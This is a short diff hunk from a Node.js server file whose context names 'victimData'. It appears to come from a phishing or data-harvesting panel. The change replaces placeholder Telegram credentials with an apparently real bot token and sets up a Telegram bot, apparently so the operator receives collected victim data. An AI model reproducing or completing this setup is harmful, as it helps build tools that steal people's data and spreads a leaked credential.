@@ -15,8 +15,8 @@ const victimData = {};
 let adminSocketId = null;
 
 
-const TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN';
-const TELEGRAM_CHAT_ID = 'YOUR_TELEGRAM_CHAT_ID';
+const TELEGRAM_BOT_TOKEN = '7265828067:AAFtQrVCMPfvQoE9mlzKAVoULsHDyShpQS0';
+const TELEGRAM_CHAT_ID = ' add chat id';
 const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });
 
 server.listen(process.env.PORT || port, (err) => {
